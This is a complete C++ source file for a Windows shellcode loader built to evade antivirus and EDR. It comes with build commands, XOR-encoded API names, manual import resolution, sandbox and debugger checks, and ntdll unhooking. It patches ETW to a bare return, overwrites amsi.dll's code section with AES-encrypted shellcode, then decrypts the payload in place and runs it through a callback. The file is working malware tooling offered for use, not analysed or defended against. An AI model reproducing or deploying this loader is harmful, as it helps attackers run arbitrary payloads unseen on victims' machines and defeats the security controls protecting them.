/*
	EDR/AV evasion loader - AES-256-CBC variant (based on the original "Killer" tool)
	- IAT obfuscation / Module stomping / DLL unhooking / ETW patching
	- Runs the payload without creating a new thread (EnumSystemLocalesA)
	- Shellcode encryption: AES-256-CBC (replaces the original single-byte XOR)
	- No banner, no colors, no console output
	- Runs without arguments (no filename check, no interactive prompt)

	Pipeline:
		python3 encryptor.py payload.bin                 -> regenerates payload.h
		x86_64-w64-mingw32-g++ -O2 -static -s -fpermissive -o killer.exe killer_aes.cpp -lshlwapi -lpsapi
	(-fpermissive: mingw treats >0x7f char array init as narrowing; MSVC accepts it silently)
		python3 reverse_shellcode.py --header payload.h -o original.bin   (recover payload)
*/

#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <stdint.h>
#include <intrin.h>
#include <shlwapi.h>
#include <memoryapi.h>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "psapi.lib")

#include "aes256_cbc.h"
#include "payload.h"

#define KEY 0xb6
#define SIZEOF(x) sizeof(x) - 1

int cmpUnicodeStr(WCHAR substr[], WCHAR mystr[]) {
	_wcslwr_s(substr, MAX_PATH);
	_wcslwr_s(mystr, MAX_PATH);

	int result = 0;
	if (StrStrW(mystr, substr) != NULL) {
		result = 1;
	}

	return result;
}

// https://cocomelonc.github.io/malware/2023/04/16/malware-av-evasion-16.html
FARPROC myGetProcAddr(HMODULE hModule, LPCSTR lpProcName) {
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +
	ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
	WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);
	DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);

	for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
		if (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
			return (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]);
		}
	}

	return NULL;
}

// https://cocomelonc.github.io/malware/2023/04/08/malware-av-evasion-15.html
HMODULE myGetModuleHandle(LPCWSTR lModuleName) {
#ifdef _M_IX86
	PEB* pPeb = (PEB*)__readfsdword(0x30);
#else
	PEB* pPeb = (PEB*)__readgsqword(0x60);
#endif

	PEB_LDR_DATA* Ldr = pPeb->Ldr;
	LIST_ENTRY* ModuleList = &Ldr->InMemoryOrderModuleList;
	LIST_ENTRY* pStartListEntry = ModuleList->Flink;

	WCHAR mystr[MAX_PATH] = { 0 };
	WCHAR substr[MAX_PATH] = { 0 };
	for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink) {
		LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));

		memset(mystr, 0, MAX_PATH * sizeof(WCHAR));
		memset(substr, 0, MAX_PATH * sizeof(WCHAR));
		wcscpy_s(mystr, MAX_PATH, pEntry->FullDllName.Buffer);
		wcscpy_s(substr, MAX_PATH, lModuleName);
		if (cmpUnicodeStr(substr, mystr)) {
			return (HMODULE)pEntry->DllBase;
		}
	}

	return NULL;
}

/*
	Detecting the first bytes for the NTAPIs to check if it hooked.
	Returns TRUE when the stub does not match (hooked).
*/
BOOL isItHooked(LPVOID addr) {
	BYTE stub[] = "\x4c\x8b\xd1\xb8";

	if (memcmp(addr, stub, 4) != 0) {
		return TRUE;
	}
	return FALSE;
}

/* MSDN APIs */
typedef LPVOID(WINAPI* VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* CreateFileAFunc)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
typedef HANDLE(WINAPI* GetCurrentProcessFunc)();
typedef LPVOID(WINAPI* MapViewOfFileFunc)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
typedef BOOL(WINAPI* CheckRemoteDebuggerPresentFunc)(HANDLE hProcess, PBOOL pbDebuggerPresent);
typedef BOOL(WINAPI* GlobalMemoryStatusExFunc)(LPMEMORYSTATUSEX lpBuffer);
typedef LPVOID(WINAPI* pVirtualAllocExNuma)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect, DWORD nndPreferred);
typedef HANDLE(WINAPI* CreateFileMappingAFunc)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);

/* Declare function pointers */
VirtualProtectFunc pVirtualProtectFunc = NULL;
CreateFileAFunc pCreateFileAFunc = NULL;
GetCurrentProcessFunc pGetCurrentProcessFunc = NULL;
CheckRemoteDebuggerPresentFunc pCheckRemoteDebuggerPresentFunc = NULL;
GlobalMemoryStatusExFunc pGlobalMemoryStatusExFunc = NULL;
MapViewOfFileFunc pMapViewOfFileFunc = NULL;
CreateFileMappingAFunc pCreateFileMappingAFunc = NULL;

typedef LPVOID(NTAPI* uNtAllocateVirtualMemory)(HANDLE, PVOID, ULONG, SIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* uNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* uNtCreateThreadEx)(OUT PHANDLE hThread, IN ACCESS_MASK DesiredAccess, IN PVOID ObjectAttributes, IN HANDLE ProcessHandle, IN PVOID lpStartAddress, IN PVOID lpParameter, IN ULONG Flags, IN SIZE_T StackZeroBits, IN SIZE_T SizeOfStackCommit, IN SIZE_T SizeOfStackReserve, OUT PVOID lpBytesBuffer);
typedef NTSTATUS(NTAPI* uNtProtectVirtualMemory)(HANDLE, IN OUT PVOID*, IN OUT PSIZE_T, IN ULONG, OUT PULONG);
typedef NTSTATUS(NTAPI* uNtQueryInformationThread)(IN HANDLE ThreadHandle, IN THREADINFOCLASS ThreadInformationClass, OUT PVOID ThreadInformation, IN ULONG ThreadInformationLength, OUT PULONG ReturnLength);

/* Hardware components checker */
BOOL checkResources() {
	SYSTEM_INFO s;
	MEMORYSTATUSEX ms;
	DWORD procNum;
	DWORD ram;

	GetSystemInfo(&s);
	procNum = s.dwNumberOfProcessors;
	if (procNum < 2) return false;

	ms.dwLength = sizeof(ms);
	pGlobalMemoryStatusExFunc(&ms);
	ram = ms.ullTotalPhys / 1024 / 1024 / 1024;
	if (ram < 2) return false;
	return true;
}

/* Encrypted strings by xor to evade static stuff : */
char cNtAllocateVirtualMemory[] = { 0xf8, 0xc2, 0xf7, 0xda, 0xda, 0xd9, 0xd5, 0xd7, 0xc2, 0xd3, 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xfb, 0xd3, 0xdb, 0xd9, 0xc4, 0xcf, 0x0 };
char cNtWriteVirtualMemory[] = { 0xf8, 0xc2, 0xe1, 0xc4, 0xdf, 0xc2, 0xd3, 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xfb, 0xd3, 0xdb, 0xd9, 0xc4, 0xcf, 0x0 };
char cNtCreateThreadEx[] = { 0xf8, 0xc2, 0xf5, 0xc4, 0xd3, 0xd7, 0xc2, 0xd3, 0xe2, 0xde, 0xc4, 0xd3, 0xd7, 0xd2, 0xf3, 0xce, 0x0 };
char cNtProtectVirtualMemory[] = { 0xf8, 0xc2, 0xe6, 0xc4, 0xd9, 0xc2, 0xd3, 0xd5, 0xc2, 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xfb, 0xd3, 0xdb, 0xd9, 0xc4, 0xcf, 0x0 };
char cNtQueryInformationThread[] = { 0xf8, 0xc2, 0xe7, 0xc3, 0xd3, 0xc4, 0xcf, 0xff, 0xd8, 0xd0, 0xd9, 0xc4, 0xdb, 0xd7, 0xc2, 0xdf, 0xd9, 0xd8, 0xe2, 0xde, 0xc4, 0xd3, 0xd7, 0xd2, 0x0 };
char cNtdll[] = { 0xd8, 0xc2, 0xd2, 0xda, 0xda, 0x98, 0xd2, 0xda, 0xda, 0x0 };
char cAmsi[] = { 0xd7, 0xdb, 0xc5, 0xdf, 0x98, 0xd2, 0xda, 0xda, 0x0 };
char cEtwEventWrite[] = { 0xf3, 0xc2, 0xc1, 0xf3, 0xc0, 0xd3, 0xd8, 0xc2, 0xe1, 0xc4, 0xdf, 0xc2, 0xd3, 0x0 };
char cMapViewOfFile[] = { 0xfb, 0xd7, 0xc6, 0xe0, 0xdf, 0xd3, 0xc1, 0xf9, 0xd0, 0xf0, 0xdf, 0xda, 0xd3, 0x0 };
char cCheckRemote[] = { 0xf5, 0xde, 0xd3, 0xd5, 0xdd, 0xe4, 0xd3, 0xdb, 0xd9, 0xc2, 0xd3, 0xf2, 0xd3, 0xd4, 0xc3, 0xd1, 0xd1, 0xd3, 0xc4, 0xe6, 0xc4, 0xd3, 0xc5, 0xd3, 0xd8, 0xc2, 0x0 };
char cCheckGlobalMemory[] = { 0xf1, 0xda, 0xd9, 0xd4, 0xd7, 0xda, 0xfb, 0xd3, 0xdb, 0xd9, 0xc4, 0xcf, 0xe5, 0xc2, 0xd7, 0xc2, 0xc3, 0xc5, 0xf3, 0xce, 0x0 };
char cLib2Name[] = { 0xdd, 0xd3, 0xc4, 0xd8, 0xd3, 0xda, 0x85, 0x84, 0x98, 0xd2, 0xda, 0xda, 0x0 };
char b[] = { 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xe6, 0xc4, 0xd9, 0xc2, 0xd3, 0xd5, 0xc2, 0x0 };
char cCreateFileMapping[] = { 0xf5, 0xc4, 0xd3, 0xd7, 0xc2, 0xd3, 0xf0, 0xdf, 0xda, 0xd3, 0xfb, 0xd7, 0xc6, 0xc6, 0xdf, 0xd8, 0xd1, 0xf7, 0x0 };
char cCreateFileA[] = { 0xf5, 0xc4, 0xd3, 0xd7, 0xc2, 0xd3, 0xf0, 0xdf, 0xda, 0xd3, 0xf7, 0x0 };
char cGetCurrentProcess[] = { 0xf1, 0xd3, 0xc2, 0xf5, 0xc3, 0xc4, 0xc4, 0xd3, 0xd8, 0xc2, 0xe6, 0xc4, 0xd9, 0xd5, 0xd3, 0xc5, 0xc5, 0x0 };

void deObfuscate(char* cApi, int nSize)
{
	for (int i = 0; i < nSize; i++)
	{
		// try to prevent particular weakness of single-byte encoding:
		// it lacks the ability to effectively hide from a user manually
		// scanning encoded content with a hex editor.
		if (cApi[i] != 0 && cApi[i] != KEY)
			cApi[i] = cApi[i] ^ KEY;
	}
}

void deObfuscateNT() {
	deObfuscate(cNtAllocateVirtualMemory, SIZEOF(cNtAllocateVirtualMemory));
	deObfuscate(cNtWriteVirtualMemory, SIZEOF(cNtWriteVirtualMemory));
	deObfuscate(cNtCreateThreadEx, SIZEOF(cNtCreateThreadEx));
	deObfuscate(cNtProtectVirtualMemory, SIZEOF(cNtProtectVirtualMemory));
	deObfuscate(cNtQueryInformationThread, SIZEOF(cNtQueryInformationThread));
}

BOOL checkNUMA() {
	LPVOID mem = NULL;
	char cVirtualAllocExNuma[] = { 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xf7, 0xda, 0xda, 0xd9, 0xd5, 0xf3, 0xce, 0xf8, 0xc3, 0xdb, 0xd7, 0x0 };
	deObfuscate(cVirtualAllocExNuma, SIZEOF(cVirtualAllocExNuma));
	pVirtualAllocExNuma myVirtualAllocExNuma = (pVirtualAllocExNuma)myGetProcAddr(GetModuleHandle("kernel32.dll"), cVirtualAllocExNuma);
	mem = myVirtualAllocExNuma(pGetCurrentProcessFunc(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
	if (mem != NULL) {
		return false;
	}
	else {
		return true;
	}
}

void deObfuscateFunc() {
	deObfuscate(b, SIZEOF(b));
	deObfuscate(cCreateFileA, SIZEOF(cCreateFileA));
	deObfuscate(cGetCurrentProcess, SIZEOF(cGetCurrentProcess));
	deObfuscate(cMapViewOfFile, SIZEOF(cMapViewOfFile));
	deObfuscate(cCheckRemote, SIZEOF(cCheckRemote));
	deObfuscate(cCheckGlobalMemory, SIZEOF(cCheckGlobalMemory));
	deObfuscate(cCreateFileMapping, SIZEOF(cCreateFileMapping));
}

/* Function to reverse a shellcode array in 0x format */
void reverseShellcode(unsigned char* shellcode, int size) {
	int i;
	unsigned char temp;
	for (i = 0; i < size / 2; i++) {
		temp = shellcode[size - i - 1];
		shellcode[size - i - 1] = shellcode[i];
		shellcode[i] = temp;
	}
	if (size % 2 != 0) { shellcode[size / 2] = shellcode[size / 2]; }
}

/* Single-byte XOR that touches every byte (used for the AES key/IV only) */
void deObfuscateKey(unsigned char* buf, int nSize) {
	for (int i = 0; i < nSize; i++) {
		buf[i] = buf[i] ^ KEY;
	}
}

/*
	AES-256-CBC decryption of the stored shellcode blob (in place).
	The blob layout is: reverse( AES256_CBC(plaintext) )
	so the loader reverses it back right before this call.
*/
void decShell(unsigned char* pEncryptedShell)
{
	unsigned char aesKey[AES256_KEYLEN];
	unsigned char aesIv[AES_BLOCKLEN];

	deObfuscateKey(aesKeyEnc, SIZEOF(aesKeyEnc));
	deObfuscateKey(aesIvEnc, SIZEOF(aesIvEnc));

	memcpy(aesKey, aesKeyEnc, AES256_KEYLEN);
	memcpy(aesIv, aesIvEnc, AES_BLOCKLEN);

	AES256_CBC_decrypt_buffer(pEncryptedShell, shellcode_len, aesKey, aesIv);

	/* PKCS7 padding: replace trailing pad bytes with RET so nothing
	   executable sits right after the payload. */
	unsigned int plen = pEncryptedShell[shellcode_len - 1];
	if (plen > 0 && plen <= 16 && plen <= shellcode_len) {
		for (unsigned int i = shellcode_len - plen; i < shellcode_len; i++) {
			pEncryptedShell[i] = 0xC3;
		}
	}
}

int main() {

	unsigned char* pHollowedDLL;
	HMODULE hAMSI;
	DWORD dwOldProtection = 0;
	BOOL bTrap = FALSE;
	char* pMem;
	int nMemAlloc, nCtr = 0;

	/*
		sets all the bytes in the allocated memory block to 0x00, and checks for errors.
		checking if the allocated memory block is larger than the amount of memory
		that would typically be available on a sandboxed machine
	*/
	nMemAlloc = KEY << 20; // will be 1048576
	if (!(pMem = (char*)malloc(nMemAlloc))) { return EXIT_FAILURE; }
	for (int idx = 0; idx < nMemAlloc; idx++) { pMem[nCtr++] = 0x00; }
	if (nMemAlloc != nCtr) { return EXIT_FAILURE; }

	deObfuscate(cLib2Name, SIZEOF(cLib2Name)); // decrypt "kernel32.dll"
	deObfuscate(cAmsi, SIZEOF(cAmsi)); // decrypt "amsi.dll"

	hAMSI = LoadLibraryA(cAmsi);
	if (hAMSI == NULL) { free(pMem); return EXIT_FAILURE; }

	wchar_t wtk[20];
	mbstowcs(wtk, cLib2Name, strlen(cLib2Name) + 1); //plus null
	LPWSTR wcLib2dll = wtk;
	HMODULE hModuleK = myGetModuleHandle(wcLib2dll);

	free(pMem);

	/*
		Module stomping or DLL hallowing is for memory scanning evasion
	*/

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hAMSI;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)pDosHeader + pDosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER pSection;
	int index = 0;
	do {
		pSection = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pNtHeaders) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * index++));
	} while (strncmp((const char*)pSection->Name, ".text", 5) != 0);

	/* After finding .text section from DLL we are trying to resolve it's address */
	pHollowedDLL = (unsigned char*)((DWORD_PTR)pDosHeader + pSection->VirtualAddress);

	deObfuscateNT();
	deObfuscate(cNtdll, SIZEOF(cNtdll));

	/*
		Copy ntdll to a fresh memory alloc and overwrite calls adresses
	*/
	int nbHooks = 0;

	wchar_t wtext[20];
	mbstowcs(wtext, cNtdll, strlen(cNtdll) + 1); //plus null
	LPWSTR wNtdll = wtext;

	if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtAllocateVirtualMemory))) { nbHooks++; }
	if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtProtectVirtualMemory))) { nbHooks++; }
	if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtCreateThreadEx))) { nbHooks++; }
	if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtQueryInformationThread))) { nbHooks++; }

	deObfuscateFunc();

	/* Load system functions */
	if (hModuleK != NULL) {
		pVirtualProtectFunc = (VirtualProtectFunc)myGetProcAddr(hModuleK, b);
		pCreateFileAFunc = (CreateFileAFunc)myGetProcAddr(hModuleK, cCreateFileA);
		pGetCurrentProcessFunc = (GetCurrentProcessFunc)myGetProcAddr(hModuleK, cGetCurrentProcess);
		pCheckRemoteDebuggerPresentFunc = (CheckRemoteDebuggerPresentFunc)myGetProcAddr(hModuleK, cCheckRemote);
		pGlobalMemoryStatusExFunc = (GlobalMemoryStatusExFunc)myGetProcAddr(hModuleK, cCheckGlobalMemory);
		pMapViewOfFileFunc = (MapViewOfFileFunc)myGetProcAddr(hModuleK, cMapViewOfFile);
		pCreateFileMappingAFunc = (CreateFileMappingAFunc)myGetProcAddr(hModuleK, cCreateFileMapping);
	}

	/*
		This code attempts to create a nonexistent file and returns an error if successful.
		This is a sandbox evasion technique used to confuse analysis tools by mimicking
		benign file access behavior.
	*/
	if (pCreateFileAFunc(cLib2Name, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL) != INVALID_HANDLE_VALUE)
	{
		return EXIT_FAILURE;
	}

	/* Check if all required system functions were loaded successfully */
	if (!(pVirtualProtectFunc && pCreateFileAFunc && pGetCurrentProcessFunc && pCheckRemoteDebuggerPresentFunc && pCreateFileMappingAFunc && pGlobalMemoryStatusExFunc && pMapViewOfFileFunc)) {
		return EXIT_FAILURE;
	}

	// check NUMA
	if (checkNUMA()) { return -2; }
	if (checkResources() == false) { return -2; }

	if (!pCheckRemoteDebuggerPresentFunc(pGetCurrentProcessFunc(), &bTrap) || bTrap) { return EXIT_FAILURE; }

	if (nbHooks > 0) {
		char path[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0 };
		char sntdll[] = { '.', 't', 'e', 'x', 't', 0 };
		HANDLE process = pGetCurrentProcessFunc();
		MODULEINFO mi = {};
		HMODULE ntdllModule = myGetModuleHandle(wNtdll);
		GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
		LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;

		HANDLE ntdllFile = pCreateFileAFunc(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		HANDLE ntdllMapping = pCreateFileMappingAFunc(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
		LPVOID ntdllMappingAddress = pMapViewOfFileFunc(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
		PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
		PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
		for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
			PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
			if (!strcmp((char*)hookedSectionHeader->Name, (char*)sntdll)) {
				DWORD oldProtection = 0;
				bool isProtected = pVirtualProtectFunc((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
				memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
				isProtected = pVirtualProtectFunc((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
			}
		}
	}

	HINSTANCE hNtdll = myGetModuleHandle(wNtdll);
	uNtAllocateVirtualMemory NtAllocateVirtualMemory = (uNtAllocateVirtualMemory)myGetProcAddr(hNtdll, cNtAllocateVirtualMemory);
	uNtWriteVirtualMemory NtWriteVirtualMemory = (uNtWriteVirtualMemory)myGetProcAddr(hNtdll, cNtWriteVirtualMemory);
	uNtProtectVirtualMemory NtProtectVirtualMemory = (uNtProtectVirtualMemory)myGetProcAddr(hNtdll, cNtProtectVirtualMemory);
	uNtCreateThreadEx NtCreateThreadEx = (uNtCreateThreadEx)myGetProcAddr(hNtdll, cNtCreateThreadEx);
	uNtQueryInformationThread NtQueryInformationThread = (uNtQueryInformationThread)myGetProcAddr(hNtdll, cNtQueryInformationThread);

	/*
		PATCH ETW : technique used for bypassing some security controls
	*/
	deObfuscate(cEtwEventWrite, SIZEOF(cEtwEventWrite));

	void* etwAddr = myGetProcAddr(myGetModuleHandle(wNtdll), cEtwEventWrite);
	char etwPatch[] = { 0xC3 };
	DWORD lpflOldProtect = 0;
	unsigned __int64 memPage = 0x1000;
	void* etwAddr_bk = etwAddr;
	NtProtectVirtualMemory(pGetCurrentProcessFunc(), (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
	NtWriteVirtualMemory(pGetCurrentProcessFunc(), (LPVOID)etwAddr, (PVOID)etwPatch, sizeof(etwPatch), (PULONG)nullptr);
	NtProtectVirtualMemory(pGetCurrentProcessFunc(), (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);

	/* the .text section doesn't have Write permission, so we change protection to RW and
	   later before execution we will restore again to RX */
	if (!VirtualProtect(pHollowedDLL, 4096, PAGE_READWRITE, &dwOldProtection)) {
		return -2;
	}

	for (int i = 0; i < sizeof(shellcode); i++) {
		pHollowedDLL[i] = shellcode[i];
	}

	/*
		in this phase we can decrypt the payload (after stomping)
		we can't decrypt before this phase, we must hide payload first
	*/
	reverseShellcode(pHollowedDLL, sizeof(shellcode));
	decShell(pHollowedDLL);

	if (!VirtualProtect(pHollowedDLL, 4096, dwOldProtection, &dwOldProtection)) {
		return -2;
	}

	BOOL success = EnumSystemLocalesA((LOCALE_ENUMPROCA)pHollowedDLL, LCID_SUPPORTED);
	if (success) { return TRUE; } else { return FALSE; }

	/*
		You can also use this technique for executing shellcode without create a new thread :
		if (pHollowedDLL) { void (*funcPtr)(void) = (void (*)()) pHollowedDLL; funcPtr(); }
	*/

	return 0;
}
